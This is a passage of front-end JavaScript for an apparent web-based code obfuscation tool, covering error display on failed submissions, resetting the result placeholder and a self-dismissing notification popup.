      loading.classList.remove("show")
      resultPlaceholder.style.display = "flex"
      resultPlaceholder.innerHTML = `
                <div class="icon"><i class="fas fa-exclamation-triangle"></i></div>
                <p style="color: #dc3545;">Obfuscation failed</p>
                <small>Error: ${error.message}</small>
            `
      resultPlaceholder.classList.add("error-state")

      showNotification("error", `Obfuscation failed: ${error.message}`)
      console.error("Error details:", error)
    } finally {
      processBtn.disabled = false
      processBtn.innerHTML = '<i class="fas fa-bolt"></i> Obfuscate Code'
    }
  })

  // Reset placeholder on input change
  fileUrlInput.addEventListener("input", () => {
    resultPlaceholder.classList.remove("error-state")
    if (resultPlaceholder.style.display === "flex") {
      resultPlaceholder.innerHTML = `
                <div class="icon"><i class="fas fa-file-code"></i></div>
                <p>Your obfuscated code will appear here</p>
                <small>Login and submit your JavaScript file to get started</small>
            `
    }
  })
}

// Notification system
function showNotification(type, message) {
  const existingNotifications = document.querySelectorAll(".notification")
  existingNotifications.forEach((notification) => {
    if (document.body.contains(notification)) {
      document.body.removeChild(notification)
    }
  })

  const notification = document.createElement("div")
  notification.className = `notification ${type}`

  const icon = type === "success" ? "check-circle" : "exclamation-circle"

  notification.innerHTML = `
        <div class="notification-icon"><i class="fas fa-${icon}"></i></div>
        <div class="notification-message">${message}</div>
        <button class="notification-close"><i class="fas fa-times"></i></button>
    `

  document.body.appendChild(notification)

  const closeBtn = notification.querySelector(".notification-close")
  closeBtn.addEventListener("click", () => {
    notification.style.animation = "slideOutRight 0.3s ease-out"
    setTimeout(() => {
      if (document.body.contains(notification)) {
        document.body.removeChild(notification)
      }
    }, 300)
  })

  setTimeout(() => {
    if (document.body.contains(notification)) {
      notification.style.animation = "slideOutRight 0.3s ease-out"
      setTimeout(() => {
        if (document.body.contains(notification)) {
          document.body.removeChild(notification)
        }
      }, 300)
    }
  }, 5000)
}
